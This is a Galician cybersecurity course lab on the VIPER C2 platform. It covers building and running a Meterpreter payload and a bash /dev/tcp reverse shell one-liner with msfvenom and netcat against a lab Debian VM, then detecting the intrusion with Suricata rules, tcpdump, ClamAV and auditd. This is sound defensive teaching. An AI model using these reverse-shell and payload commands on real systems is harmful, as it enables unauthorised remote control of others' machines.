de VIPER.</li> <li> <p>C2 (Command and Control) \u00e9 un acr\u00f3nimo est\u00e1ndar en seguridade inform\u00e1tica que significa Command and Control. Forma parte da terminolox\u00eda habitual en seguridade ofensiva e defensiva, especialmente en operaci\u00f3ns de Red Teaming e en ataques reais levados a cabo por actores maliciosos.   O servidor C2 \u00e9 un servidor centralizado que os atacantes utilizan para controlar os dispositivos comprometidos. No contexto de VIPER, \u00e9 o elemento que recibe comunicaci\u00f3ns dende as m\u00e1quinas comprometidas, env\u00eda comandos e recibe datos extra\u00eddos (exfiltraci\u00f3n).</p> <p>Permite:   - Control remoto dos sistemas comprometidos.   - Exfiltraci\u00f3n de datos.   - Persistencia e mantemento de acceso.   - Aplicar t\u00e9cnicas de evasi\u00f3n para evitar detecci\u00f3ns. </p> </li> </ul> <p>Por que \u00e9 importante o bastionado? Asegurar os sistemas mediante probas realistas permite que as organizaci\u00f3ns comprendan mellor as s\u00faas debilidades e implementen contramedidas axeitadas. Isto \u00e9 esencial para reducir a superficie de ataque e garantir que, mesmo en caso de comprometer un sistema, os danos sexan minimizados.</p>"},{"location":"ud4/viper/#alcance-da-proba","title":"Alcance da Proba","text":"<ul> <li>Probas focalizadas en sistemas GNU/Linux e Microsoft Windows dentro dunha rede interna corporativa.</li> <li>T\u00e9cnicas utilizadas: Reverse Shell, Movemento Lateral e Persistencia.</li> <li>Obxectivo principal: Identificar fallas explotables e suxerir mitigaci\u00f3ns eficaces.</li> </ul>"},{"location":"ud4/viper/#vm-1-atacante-viper","title":"VM-1 Atacante: VIPER","text":""},{"location":"ud4/viper/#1-requisitos-do-sistema","title":"1. Requisitos do Sistema","text":"<p>A instalaci\u00f3n m\u00ednima require:</p> <ul> <li>2 n\u00facleos de CPU (2U) e 4 GB de RAM (4G).</li> <li>5GB de espazo en disco</li> <li>Linux kernel 5.x e superior. Imos empregar Debian 12</li> </ul>"},{"location":"ud4/viper/#2-descarga-e-instalacion-de-viper","title":"2. Descarga e Instalaci\u00f3n de VIPER","text":"<p>Visita o sitio oficial: viperrtp.com e segue as instruci\u00f3ns proporcionadas para descargar e instalar VIPER.</p> <p>Basicamente: 1. Cambiar ao usuario <code>root</code>: <pre><code>su - root\n</code></pre> 2. Optimizar a configuraci\u00f3n do sistema operativo <pre><code>sysctl -w net.ipv4.tcp_timestamps=0 # Desactiva as marcas de tempo TCP (RFC 1323).\nsysctl -w net.ipv4.tcp_tw_reuse=1 # Permite reutilizar sockets en estado TIME_WAIT para novas conexi\u00f3ns sa\u00edntes.\nsysctl -w net.ipv4.tcp_tw_recycle=1 # Habilita a reciclaxe r\u00e1pida de sockets TIME_WAIT (obsoleto/problem\u00e1tico con NAT, require timestamps).\nsysctl -w net.ipv4.tcp_fin_timeout=3 # Reduce o tempo (segundos) que un socket permanece no estado FIN_WAIT_2.\nsysctl -w net.ipv4.tcp_keepalive_time=1800 # Tempo (segundos) de inactividade antes de enviar sondas TCP keepalive (30 min).\nsysctl -w net.ipv4.tcp_rmem=\"4096 87380 8388608\" # Establece os tama\u00f1os m\u00ednimo, predeterminado e m\u00e1ximo (bytes) do b\u00fafer de recepci\u00f3n TCP.\nsysctl -w net.ipv4.tcp_wmem=\"4096 87380 8388608\" # Establece os tama\u00f1os m\u00ednimo, predeterminado e m\u00e1ximo (bytes) do b\u00fafer de env\u00edo TCP.\nsysctl -w net.ipv4.tcp_max_syn_backlog=262144 # Tama\u00f1o m\u00e1ximo da cola para conexi\u00f3ns TCP entrantes pendentes (SYN_RECV).\nsysctl -w net.ipv4.ip_local_port_range=\"1024 65535\" # Define o rango de portos locais ef\u00e9meros para conexi\u00f3ns sa\u00edntes.\nsysctl -w net.core.rmem_max=16777216 # Tama\u00f1o m\u00e1ximo absoluto (bytes) do b\u00fafer de recepci\u00f3n para todos os sockets.\nsysctl -w net.core.wmem_max=16777216 # Tama\u00f1o m\u00e1ximo absoluto (bytes) do b\u00fafer de env\u00edo para todos os sockets.\nsysctl -w net.ipv4.tcp_window_scaling=0 # Desactiva o escalado da xanela TCP (RFC 1323), pode limitar o rendemento.\nsysctl -w net.ipv4.tcp_sack=0 # Desactiva o Acuse de Recibo Selectivo (SACK), pode afectar a recuperaci\u00f3n de perdas.\nsysctl -w net.core.netdev_max_backlog=30000 # Tama\u00f1o m\u00e1ximo da cola de paquetes de entrada por interface de rede antes de procesalos.\nsysctl -w net.ipv4.tcp_no_metrics_save=1 # Evita gardar m\u00e9tricas de conexi\u00f3ns TCP na cach\u00e9 de rutas ao pechar.\nsysctl -w net.core.somaxconn=262144 # Tama\u00f1o m\u00e1ximo da cola de conexi\u00f3ns completadas esperando ser aceptadas (`accept()`).\nsysctl -w net.ipv4.tcp_syncookies=0 # Desactiva as SYN cookies (mecanismo de protecci\u00f3n contra ataques SYN flood).\nsysctl -w net.ipv4.tcp_max_orphans=262144 # N\u00famero m\u00e1ximo de sockets TCP 'orfos' (sen proceso asociado) no sistema.\nsysctl -w net.ipv4.tcp_synack_retries=2 # N\u00famero m\u00e1ximo de reintentos para enviar un SYN/ACK en resposta a un SYN.\nsysctl -w net.ipv4.tcp_syn_retries=2 # N\u00famero m\u00e1ximo de reintentos para enviar un SYN ao iniciar unha conexi\u00f3n.\n\necho \"ulimit -HSn 65535\" &gt;&gt; /etc/rc.local # Engade comando a rc.local para aumentar o l\u00edmite de ficheiros abertos ao arrancar (legacy).\necho \"ulimit -HSn 65535\" &gt;&gt;/root/.bash_profile # Engade comando ao perfil Bash de root para aumentar o l\u00edmite de ficheiros abertos nas s\u00faas sesi\u00f3ns.\necho \"ulimit -SHn 65535\" &gt;&gt; /etc/profile # Engade comando ao perfil global para aumentar o l\u00edmite de ficheiros abertos para todos os usuarios.\nulimit -SHn 65535 # Establece o l\u00edmite de ficheiros abertos (soft e hard) para a sesi\u00f3n actual da shell.\n\nsysctl -w vm.max_map_count=262144 # Aumenta o n\u00famero m\u00e1ximo de rexi\u00f3ns de mapeo de memoria (mmap) que pode ter un proceso.\n</code></pre> 3. Instalar docker <pre><code>apt update \\\n&amp;&amp; apt -y install docker.io \\\n&amp;&amp; apt -y install docker-compose \n/etc/init.d/docker status || systemctl status docker\n</code></pre> 4. Xerar e acceder ao directorio de instalaci\u00f3n: <pre><code>export VIPER_DIR=/root/VIPER\nmkdir -p $VIPER_DIR &amp;&amp; cd $VIPER_DIR\n</code></pre> 5. Xerar docker-compose.yml <pre><code>tee docker-compose.yml &lt;&lt;-'EOF'\nservices:\n  viper:\n    image: viperplatform/viper:latest\n    container_name: viper-c\n    network_mode: \"host\"\n    restart: always\n    volumes:\n      - ${PWD}/loot:/root/.msf4/loot\n      - ${PWD}/db:/root/viper/Docker/db\n      - ${PWD}/module:/root/viper/Docker/module\n      - ${PWD}/log:/root/viper/Docker/log\n      - ${PWD}/nginxconfig:/root/viper/Docker/nginxconfig\n      - ${PWD}/elasticsearch:/var/lib/elasticsearch\n    ulimits:\n      nofile:\n        soft: 65534\n        hard: 65534\n      nproc:\n        soft: 65534\n        hard: 65534\n    command: [\"VIPER_PASSWORD\"]\nEOF\n</code></pre> 6. Configurar o contrasinal <code>abc123.</code> para o login do usuario <code>root</code>: <pre><code># Usar un contrasinal seguro na pr\u00e1ctica. Para o exemplo:\nexport VIPER_PASSWORD=abc123.\n</code></pre> 7. Escribir o contrasinal no arquivo <code>docker-compose.yml</code> <pre><code>sed -i \"s/VIPER_PASSWORD/$VIPER_PASSWORD/g\" docker-compose.yml\n</code></pre></p>"},{"location":"ud4/viper/#3-configuracion-do-dashboard-en-viper","title":"3. Configuraci\u00f3n do Dashboard en VIPER","text":"<p>VIPER ofrece un Dashboard web para xestionar ataques e monitorizar operaci\u00f3ns. Para acceder ao Dashboard:</p> <ol> <li> <p>Inicia o servidor VIPER: <pre><code>cd $VIPER_DIR\n# Nota: Aseg\u00farate que Docker est\u00e1 en execuci\u00f3n (systemctl start docker)\ndocker-compose up || docker-compose up -d # -d \u2192 Executar en segundo plano\n</code></pre> </p> </li> <li> <p>Acceder \u00e1 interface de Viper  <pre><code># O porto por defecto adoita ser 60000 ou similar. Verifica a documentaci\u00f3n de VIPER ou os logs de docker.\nfirefox https://localhost:60000 # Ou a IP do servidor VIPER\n</code></pre></p> </li> <li> <p>Login Username: root Password: abc123. (ou o que configuraches) </p> </li> </ol> <p>Dende o Dashboard podes xestionar os ataques.</p> <p>Hai que ter en conta que cando accedemos ao dashboard atoparemos 2 m\u00e1quinas existentes na base de datos do propio VIPER, as cales poderemos eliminar, a\u00ednda que se aparecen non afectan ao desenvolvemento desta pr\u00e1ctica.</p>"},{"location":"ud4/viper/#exemplos-practicos","title":"Exemplos Pr\u00e1cticos","text":""},{"location":"ud4/viper/#exemplo-1-reverse-shell","title":"Exemplo 1: Reverse Shell","text":""},{"location":"ud4/viper/#escenario-resumido","title":"Escenario Resumido","text":"<ul> <li><code>VM-1</code> (VIPER): <code>192.168.120.100</code> (Centro de control, onde est\u00e1 VIPER con <code>msfconsole</code>).</li> <li><code>VM-2</code> (Debian con payload activo): <code>192.168.120.101</code> (Acceso logrado dende <code>VM-1</code> a trav\u00e9s dun <code>Meterpreter</code> activo).</li> </ul> <p>Reverse TCP e Reverse Shell</p> <p>Reverse TCP: Unha conexi\u00f3n Reverse TCP \u00e9 un m\u00e9todo no que un sistema comprometido establece unha conexi\u00f3n de sa\u00edda cara a un servidor remoto (como o servidor C2 configurado con VIPER ou Metasploit).</p> <ul> <li> <p>Obxectivo: Establecer unha comunicaci\u00f3n entre o sistema comprometido e o servidor atacante.</p> </li> <li> <p>Quen inicia a conexi\u00f3n?: O sistema comprometido.</p> </li> <li> <p>Protocolo utilizado: Normalmente TCP, pero tam\u00e9n pode ser HTTP, HTTPS, etc.</p> </li> <li> <p>Uso habitual: Comunicaci\u00f3n encuberta entre a v\u00edtima e o atacante.</p> </li> <li> <p>Exemplo: <pre><code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.146.10 LPORT=4444 -f elf &gt; reverse_tcp.elf\n./reverse_tcp.elf  # Executado na m\u00e1quina comprometida.\n</code></pre></p> </li> </ul> <p>Reverse Shell: Unha Reverse Shell \u00e9 un tipo espec\u00edfico de conexi\u00f3n Reverse TCP onde o atacante obt\u00e9n acceso a un shell remoto no sistema comprometido.</p> <ul> <li>Exemplo de Reverse Shell (simple) con nc:<ul> <li>Na m\u00e1quina atacante (servidor VIPER ou Metasploit): <pre><code>nc -lvnp 4444\n</code></pre></li> <li>Na m\u00e1quina comprometida: <pre><code>bash -i &gt;&amp; /dev/tcp/192.168.146.10/4444 0&gt;&amp;1\n</code></pre></li> <li>Resultado: O atacante recibe un shell interactivo desde a m\u00e1quina comprometida.</li> </ul> </li> </ul>"},{"location":"ud4/viper/#vm-1-atacante-viper_1","title":"VM-1 Atacante: VIPER","text":"<ol> <li> <p>Crear un <code>Handler</code> en VIPER:</p> <p>Que \u00e9 un handler en seguridade ofensiva?</p> <p>Un handler \u00e9 un compo\u00f1ente que escoita e acepta conexi\u00f3ns de volta desde un payload executado nunha m\u00e1quina v\u00edtima. Act\u00faa como servidor receptor para establecer sesi\u00f3ns remotas cando se usa un <code>reverse_shell</code> ou outro tipo de carga \u00fatil.</p> <p>Os handlers son fundamentais en frameworks como Metasploit, onde se configuran (ex: <code>exploit/multi/handler</code>) para recibir sesi\u00f3ns de Meterpreter, shell inversas, etc.</p> <p>Exemplo t\u00edpico de uso:</p> <ul> <li>Configurar o handler con IP/porto local.</li> <li>Executar un payload que se conecta de volta.</li> <li>Cando a v\u00edtima executa o payload, o handler \"captura\" a sesi\u00f3n.</li> </ul> <p>Sen un handler activo, as conexi\u00f3ns de volta non se recibir\u00edan, e o acceso remoto non ser\u00eda posible.</p> <ul> <li>No Dashboard de VIPER, vai \u00e1 secci\u00f3n de <code>Handler&amp;Payload</code>.</li> <li>Crea un novo handler, por exemplo, <code>linux/x64/meterpreter/reverse_tcp</code> ou <code>windows/x64/meterpreter/reverse_tcp</code> dependendo do obxectivo.</li> <li>Configura <code>LHOST</code> coa IP do servidor VIPER (a m\u00e1quina onde corre Docker) e <code>LPORT</code> (p.ex., 4444). Sustitu\u00edr <code>&lt;IP_SERVIDOR_C2&gt;</code> pola IP de Viper. <pre><code># Exemplo para obter a IP\n$ IP_SERVIDOR_C2=$(hostname -I | cut -d' ' -f2)\n$ echo $IP_SERVIDOR_C2\n192.168.120.100 # Exemplo\n</code></pre></li> </ul> </li> <li> <p>Xerar o <code>Payload</code>:</p> <ul> <li>Na secci\u00f3n de <code>Generate Payload</code>, selecciona o handler creado.</li> <li>Elixe o formato do payload (p.ex., <code>elf</code> para Linux, <code>exe</code> para Windows).</li> <li>Descarga o payload xerado. </li> </ul> </li> </ol>"},{"location":"ud4/viper/#vm-2-maquina-vitima","title":"VM-2 M\u00e1quina V\u00edtima","text":"<ol> <li>Comprometer a M\u00e1quina V\u00edtima (VM-2 nodo Debian):<ul> <li>Transfire o payload \u00e1 m\u00e1quina v\u00edtima (simulando phishing, descarga web, USB, etc.).</li> <li>Executa o payload na m\u00e1quina v\u00edtima. <pre><code># Na m\u00e1quina v\u00edtima Linux (exemplo)\n$ chmod +x payload_descargado.elf\n$ ./payload_descargado.elf\n</code></pre> </li> </ul> </li> </ol> <p>Tempo execuci\u00f3n payload: 30 minutos</p> <p>Ver VIPER Pricing Unha das limitaci\u00f3ns que pos\u00fae a versi\u00f3n COMMUNITY que estamos a empregar \u00e9 que cada sesi\u00f3n establecida coa m\u00e1quina v\u00edtima ten unha limitaci\u00f3n de 30 minutos. Polo tanto isto hai que telo en conta para a realizaci\u00f3n desta pr\u00e1ctica xa que pode ser que a conexi\u00f3n c\u00f3rtese e haxa que crear outra, cambiando as\u00ed os PIDs dos procesos executados e os portos da conexi\u00f3n establecida.</p>"},{"location":"ud4/viper/#vm-1-atacante-viper_2","title":"VM-1 Atacante: VIPER","text":"<ol> <li> <p>Obter Remote Shell en VIPER:</p> <ul> <li>No Dashboard de VIPER, deber\u00edas ver unha nova sesi\u00f3n (axente) conectada desde a m\u00e1quina v\u00edtima (premer nos segundos de conexi\u00f3n establecidos). </li> </ul> </li> <li> <p>Execuci\u00f3n de comandos na m\u00e1quina comprometida:</p> <ul> <li>Interact\u00faa coa sesi\u00f3n para executar comandos (clic bot\u00f3n dereito do rato onde aparecen as IPs da m\u00e1quina viper e da comprometida). </li> </ul> </li> </ol>"},{"location":"ud4/viper/#vm-2-maquina-vitima_1","title":"VM-2 M\u00e1quina v\u00edtima","text":""},{"location":"ud4/viper/#monitorizacion-detectar-reverse-tcp-desde-debian-12","title":"Monitorizaci\u00f3n: Detectar Reverse TCP desde Debian 12","text":"<p>1. Monitorizaci\u00f3n de Conexi\u00f3ns Activas</p> <p>Verifica se o nodo Debian 12 est\u00e1 establecendo conexi\u00f3ns sospeitosas. Busca conexi\u00f3ns establecidas con enderezos IP que non deber\u00edan estar presentes (como a IP do teu servidor VIPER).</p> <pre><code># apt update &amp;&amp; apt -y install net-tools\n# netstat -natp | grep ESTAB\ntcp        0      0 192.168.120.101:38396   192.168.120.100:4444    ESTABLISHED 2048/./1743838036.\n</code></pre> <p>Ou usando <code>ss</code> que \u00e9 m\u00e1is moderno:</p> <pre><code># ss -natp | grep ESTAB\nESTAB     0      0      192.168.120.101:38396 192.168.120.100:4444 users:((\"1743838036.elf\",pid=2048,fd=5))\n</code></pre> <p>2. Monitorizaci\u00f3n de Procesos en Execuci\u00f3n</p> <p>Comproba cales procesos est\u00e1n escoitando en portos espec\u00edficos. E sobre todo, as conexi\u00f3ns establecidas.</p> <pre><code># lsof -i -P -n | grep ESTAB\n174383803 2048      losada    5u  IPv4  22266      0t0  TCP 192.168.120.101:38396-&gt;192.168.120.100:4444 (ESTABLISHED)\n</code></pre> <p>3. Uso de Ferramentas de Bastionado (IDS/IPS)</p> <p>Instala un sistema de detecci\u00f3n de intrusi\u00f3ns (IDS) para monitorizar o tr\u00e1fico de rede.</p> <p>Ferramentas Recomendadas: - Suricata: IDS/IPS avanzado que detecta tr\u00e1fico sospeitoso. - Zeek (antigo Bro): Monitoriza a rede e rexistra eventos an\u00f3malos. - Snort: IDS popular que permite crear regras personalizadas.  </p> <p>Suricata </p> <ul> <li> <p>Configuraci\u00f3n b\u00e1sica: <pre><code># apt install suricata -y\n# suricata-update\n# ls /var/lib/suricata/rules/\n# sed -E -i 's|(default-rule-path:).*|\\1 /var/lib/suricata/rules|' /etc/suricata/suricata.yaml\n</code></pre></p> </li> <li> <p>Execuci\u00f3n: <pre><code># suricata -c /etc/suricata/suricata.yaml -i enp0s8\n</code></pre></p> </li> <li> <p>Logs:     Executar noutra consola de <code>root</code>: <pre><code># tail -f /var/log/suricata/fast.log\n</code></pre></p> </li> <li> <p>Xerar novas regras para o porto TCP 4444 <pre><code># echo '# Detectar Reverse Shell mediante conexi\u00f3n TCP a un porto t\u00edpico (Metasploit, VIPER, etc.)\nalert tcp any any -&gt; any 4444 (msg:\"Reverse TCP Detected - Possible Metasploit/VIPER\"; sid:1000001; rev:1; classtype:trojan-activity; priority:1;)\n\n# Detectar Reverse Shell mediante conexi\u00f3n a porto alto com\u00fan (60000)\nalert tcp any any -&gt; any 60000 (msg:\"Reverse TCP Detected - Possible VIPER Connection\"; sid:1000002; rev:1; classtype:trojan-activity; priority:1;)\n\n# Detectar Reverse Shell mediante HTTP (Metasploit ou VIPER v\u00eda HTTP)\nalert http any any -&gt; any any (msg:\"Suspicious HTTP Traffic - Possible Reverse Shell\"; content:\"POST\"; http_method; sid:1000003; rev:1; classtype:trojan-activity; priority:1;)\n\n# Detectar Reverse Shell mediante HTTPS (Comunicaci\u00f3ns cifradas)\nalert tls any any -&gt; any any (msg:\"Suspicious HTTPS Traffic - Possible Reverse Shell\"; sid:1000004; rev:1; classtype:trojan-activity; priority:1;)' &gt; /var/lib/suricata/rules/local.rules\n</code></pre></p> </li> <li> <p>Configurar para cargar as regras <pre><code># sed -i '/rule-files:/a\\  - local.rules' /etc/suricata/suricata.yaml\n</code></pre></p> </li> <li> <p>Reiniciar suricata para aplicar os cambios <pre><code># systemctl restart suricata || suricata -c /etc/suricata/suricata.yaml -i enp0s8\n</code></pre></p> </li> <li> <p>Revisar de novo os Logs:     Executar noutra consola de <code>root</code>: <pre><code># tail -f /var/log/suricata/fast.log\n04/04/2025-01:47:35.393635  [**] [1:1000001:1] Reverse TCP Detected - Possible Metasploit/VIPER [**] [Classification: A Network Trojan was detected] [Priority: 1] {TCP} 192.168.120.101:47226 -&gt; 192.168.120.100:4444\n04/04/2025-01:47:36.609417  [**] [1:1000001:1] Reverse TCP Detected - Possible Metasploit/VIPER [**] [Classification: A Network Trojan was detected] [Priority: 1] {TCP} 192.168.120.101:44780 -&gt; 192.168.120.100:4444\n</code></pre></p> </li> </ul> <p>4. Monitorizaci\u00f3n do Tr\u00e1fico de Rede</p> <p>Se queres analizar o tr\u00e1fico espec\u00edfico xerado polo reverse TCP, podes usar: <pre><code># tcpdump -i enp0s8 port 4444  \ntcpdump: verbose output suppressed, use -v[v]... for full protocol decode\nlistening on enp0s8, link-type EN10MB (Ethernet), snapshot length 262144 bytes\n01:13:13.153147 IP 192.168.120.101.41552 &gt; 192.168.120.100.4444: Flags [S], seq 473515495, win 64240, options [mss 1460,sackOK,TS val 2501481294 ecr 0,nop,wscale 7], length 0\n01:13:13.154046 IP 192.168.120.100.4444 &gt; 192.168.120.101.41552: Flags [S.], seq 9365323, ack 473515496, win 65160, options [mss 1460,sackOK,TS val 826785556 ecr 2501481294,nop,wscale 7], length 0\n01:13:13.154096 IP 192.168.120.101.41552 &gt; 192.168.120.100.4444: Flags [.], ack 1, win 502, options [nop,nop,TS val 2501481295 ecr 826785556], length 0\n01:13:13.479097 IP 192.168.120.100.4444 &gt; 192.168.120.101.41552: Flags [P.], seq 1:388, ack 1, win 510, options [nop,nop,TS val 826785881 ecr 2501481295], length 387\n01:13:13.479123 IP 192.168.120.101.41552 &gt; 192.168.120.100.4444: Flags [.], ack 388, win 501, options [nop,nop,TS val 2501481620 ecr 826785881], length 0\n01:13:13.479478 IP 192.168.120.101.41552 &gt; 192.168.120.100.4444: Flags [P.], seq 1:398, ack 388, win 501, options [nop,nop,TS val 2501481620 ecr 826785881], length 397\n</code></pre>    Onde <code>4444</code> \u00e9 un porto t\u00edpico usado por Metasploit, pero debes cambialo polo porto que o teu servidor VIPER est\u00e1 usando.  </p> <p>Consulta repetida cada 5 segundos ao mesmo dominio sospeitoso</p> <pre><code># tcpdump -i enp0s8 -n -l port 53\n10:30:01.123456 IP 192.168.120.101.54321 &gt; 8.8.8.8.53: 1+ A? bad.c2-server.xyz. (35)\n10:30:06.123456 IP 192.168.120.101.54322 &gt; 8.8.8.8.53: 2+ A? bad.c2-server.xyz. (35)\n10:30:11.123456 IP 192.168.120.101.54323 &gt; 8.8.8.8.53: 3+ A? bad.c2-server.xyz. (35)\n</code></pre> <p>5. Detecci\u00f3n de Malware ou Payloads </p> <p>Se o ataque implica a descarga dun payload desde o servidor C2 (VIPER), aseg\u00farate de:</p> <ul> <li>Comprobar arquivos sospeitosos con <code>sha256sum</code> e comparalos con bases de datos de malware.</li> <li>Usar ferramentas como <code>ClamAV</code> para escanear o sistema: <pre><code># apt install clamav -y  \n# clamscan -r /home/ | tee README.txt  \n----------- SCAN SUMMARY -----------\nKnown viruses: 2058898\nEngine version: 1.0.7\nScanned directories: 112\nScanned files: 351\nInfected files: 1\nData scanned: 86.89 MB\nData read: 70.75 MB (ratio 1.23:1)\nTime: 10.159 sec (0 m 10 s)\nStart Date: 2025:04:04 01:16:55\nEnd Date:   2025:04:04 01:17:05\n# grep elf README.txt\n/home/losada/1743719330.elf: Unix.Trojan.Generic-9908886-0 FOUND\n</code></pre></li> </ul> <p>apt info clamav</p> <p>Package: clamav Version: 1.0.7+dfsg-1~deb12u1 Priority: optional Section: utils Maintainer: ClamAV Team pkg-clamav-devel@lists.alioth.debian.org Installed-Size: 30,1 MB Depends: clamav-freshclam (&gt;= 1.0.7+dfsg) | clamav-data, libc6 (&gt;= 2.34), libclamav11 (&gt;= 1.0.7), libcurl4 (&gt;= 7.16.2), libgcc-s1 (&gt;= 4.2), libjson-c5 (&gt;= 0.15), libssl3 (&gt;= 3.0.0), zlib1g (&gt;= 1:1.2.3.3) Recommends: clamav-base Suggests: libclamunrar, clamav-docs Homepage: https://www.clamav.net/ Tag: implemented-in::c, interface::commandline, role::program,  scope::utility, security::antivirus, use::scanning, works-with::file,  works-with::mail Download-Size: 5.775 kB APT-Manual-Installed: yes APT-Sources: http://deb.debian.org/debian bookworm/main amd64 Packages Description: anti-virus utility for Unix - command-line interface  Clam AntiVirus is an anti-virus toolkit for Unix. The main purpose of  this software is the integration with mail servers (attachment  scanning). The package provides a flexible and scalable  multi-threaded daemon in the clamav-daemon package, a command-line  scanner in the clamav package, and a tool for automatic updating via  the Internet in the clamav-freshclam package. The programs are based  on libclamav, which can be used by other software.  .  This package contains the command line interface. Features:   - built-in support for various archive formats, including Zip, Tar,     Gzip, Bzip2, OLE2, Cabinet, CHM, BinHex, SIS and others;   - built-in support for almost all mail file formats;   - built-in support for ELF executables and Portable Executable files     compressed with UPX, FSG, Petite, NsPack, wwpack32, MEW, Upack and     obfuscated with SUE, Y0da Cryptor and others;   - built-in support for popular document formats including Microsoft     Office and Mac Office files, HTML, RTF and PDF.  .  For scanning to work, a virus database is needed. There are two options  for getting it:   - clamav-freshclam: updates the database from Internet. This is     recommended with Internet access.   - clamav-data: for users without Internet access. The package is     not updated once installed. The clamav-getfiles package allows     creating custom packages from an Internet-connected computer.  </p> <p>6. Revisar o arquivo <code>~/.bash_history</code></p> <p>Se o ataque foi lanzado recentemente, podes revisar os comandos executados:</p> <pre><code># find / -type f -iname .bash_history -exec cat -n {} \\; 2&gt;/dev/null\n...\n93  chmod +x 1743719330.elf\n94  ./1743719330.elf\n</code></pre> <p>Tempo execuci\u00f3n payload: 30 minutos</p> <p>Ver VIPER Pricing Unha das limitaci\u00f3ns que pos\u00fae a versi\u00f3n COMMUNITY que estamos a empregar \u00e9 que cada sesi\u00f3n establecida coa m\u00e1quina v\u00edtima ten unha limitaci\u00f3n de 30 minutos. Polo tanto isto hai que telo en conta para a realizaci\u00f3n desta pr\u00e1ctica xa que pode ser que a conexi\u00f3n c\u00f3rtese e haxa que crear outra, cambiando as\u00ed os PIDs dos procesos executados e os portos da conexi\u00f3n establecida.</p> <p>7. Revisar <code>auditd</code></p> <p>Que \u00e9 auditd?</p> <p>auditd \u00e9 o daemon do subsistema de auditor\u00eda de Linux, encargado de rexistrar eventos de seguridade e actividades sensibles no sistema, como accesos a ficheiros cr\u00edticos, cambios en configuraci\u00f3ns ou execuci\u00f3ns de comandos.</p> <p>A s\u00faa configuraci\u00f3n permite controlar que eventos se rexistran e como se almacenan, o que \u00e9 \u00fatil para cumprimento normativo ou para detecci\u00f3n de comportamentos sospeitosos.</p> <p>Unha vez instalado, os logs poden consultarse en <code>/var/log/audit/audit.log</code>. P\u00f3dese complementar con regras personalizadas en <code>/etc/audit/rules.d/</code> para adaptar a auditor\u00eda aos obxectivos de seguridade do sistema.</p> <p>Instalaci\u00f3n <pre><code>apt update &amp;&amp; apt -y install auditd audispd-plugins\n</code></pre></p> <p>Configuraci\u00f3n das regras de auditor\u00eda <pre><code>echo '## Rexistrar todas as chamadas ao sistema execve (Creaci\u00f3n de Procesos)\n# -a action,list: Engadir regra \u00e1 lista de sa\u00edda (-a) ao sa\u00edr da chamada ao sistema (exit), sempre (always).\n# -F arch=b64/b32: Especifica a arquitectura (64-bit ou 32-bit). Inclu\u00edmos ambas para compatibilidade.\n# -S execve: Especifica a chamada ao sistema a monitorizar.\n# -k process_creation: Unha chave (tag) para buscar facilmente estes eventos.\n-a always,exit -F arch=b64 -S execve -k process_creation\n-a always,exit -F arch=b32 -S execve -k process_creation\n\n## Rexistrar chamadas ao sistema relacionadas con conexi\u00f3ns de rede (sa\u00edntes)\n# Monitorizamos 'connect' que \u00e9 a chamada usada para iniciar conexi\u00f3ns TCP/UDP sa\u00edntes.\n# -k network_connection: Chave para buscar eventos de conexi\u00f3n.\n-a always,exit -F arch=b64 -S connect -k network_connection\n-a always,exit -F arch=b32 -S connect -k network_connection\n\n## Rexistrar chamadas ao sistema relacionadas coa carga/descarga de m\u00f3dulos do kernel\n# -S init_module, finit_module, delete_module: Chamadas para cargar e descargar m\u00f3dulos.\n# -k module_loading: Chave para buscar estes eventos.\n-a always,exit -F arch=b64 -S init_module -S finit_module -S delete_module -k module_loading\n-a always,exit -F arch=b32 -S init_module -S finit_module -S delete_module -k module_loading\n\n## (Opcional pero Recomendado) Facer as regras inmutables (require reiniciar para cambiar)\n## Descomenta isto s\u00f3 cando esteas seguro das t\u00faas regras para maior seguridade\n# -e 2' &gt; /etc/audit/rules.d/99-custom.rules\n</code></pre></p> <p>Notas sobre as regras</p> <ul> <li>Usamos always,exit para rexistrar o evento cando a chamada ao sistema remata.  </li> <li>Especificamos ambas arquitecturas (b64, b32) por se se executan binarios de 32 bits nun sistema de 64 bits.  </li> <li>As keys (-k) son moi importantes para filtrar os logs despois.</li> </ul> <p>Cargar as Novas Regras e Activar o Servizo <pre><code>augenrules --load\nsystemctl start auditd\nsystemctl enable auditd\nsystemctl status auditd --no-pager\n</code></pre></p> <p>Verificar que as regras foron cargadas <pre><code>auditctl -l\n</code></pre></p> <p>Buscar nos Logs de Auditor\u00eda: <code>ausearch</code>    Agora <code>auditd</code> est\u00e1 rexistrando os eventos definidos. Os logs almac\u00e9nanse por defecto en <code>/var/log/audit/audit.log</code>. A ferramenta principal para buscar nestes logs \u00e9 <code>ausearch</code>.  </p> <p>Busca Espec\u00edfica para <code>payload_descargado.elf</code>: </p> <ul> <li> <p>Paso 1: Buscar a execuci\u00f3n do binario:        Usa a chave <code>process_creation</code> e o nome do executable (<code>-x</code>) para atopar cando se executou o payload. <pre><code>ausearch -k process_creation -x /ruta/completa/a/payload_descargado.elf -i\n</code></pre></p> <ul> <li>Cambia <code>/ruta/completa/a/payload_descargado.elf</code> pola ruta real onde se executou (se a co\u00f1eces) ou simplemente <code>-x payload_descargado.elf</code> se queres buscar calquera execuci\u00f3n con ese nome.</li> <li><code>-i</code>: Interpreta os valores num\u00e9ricos (como UID, GID, syscalls) en texto lexible.</li> </ul> <p>A sa\u00edda mostrar\u00e1 eventos <code>type=SYSCALL</code> relacionados coa chamada <code>execve</code>. Anota o PID (Process ID) e a data/hora aproximada do evento. Exemplo de sa\u00edda relevante:  </p> </li> </ul> <p>Executar de novo o payload</p> <p>Unha vez cargadas as novas regras d\u00e9bese executar de novo o payload para verificar que rexistran os eventos definidos.</p> <pre><code># ausearch -k process_creation -x 1743838036.elf -i\n----\ntype=PROCTITLE msg=audit(05/04/25 22:28:49.552:226) : proctitle=./1743838036.elf\ntype=PATH msg=audit(05/04/25 22:28:49.552:226) : item=1 name=./1743838036.elf inode=261588 dev=08:01 mode=file,755 ouid=losada ogid=losada rdev=00:00 nametype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 cap_frootid=0\ntype=PATH msg=audit(05/04/25 22:28:49.552:226) : item=0 name=./1743838036.elf inode=261588 dev=08:01 mode=file,755 ouid=losada ogid=losada rdev=00:00 nametype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 cap_frootid=0\ntype=CWD msg=audit(05/04/25 22:28:49.552:226) : cwd=/home/losada\ntype=EXECVE msg=audit(05/04/25 22:28:49.552:226) : argc=1 a0=./1743838036.elf\ntype=SYSCALL msg=audit(05/04/25 22:28:49.552:226) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x55ff719369a0 a1=0x55ff7193bc50 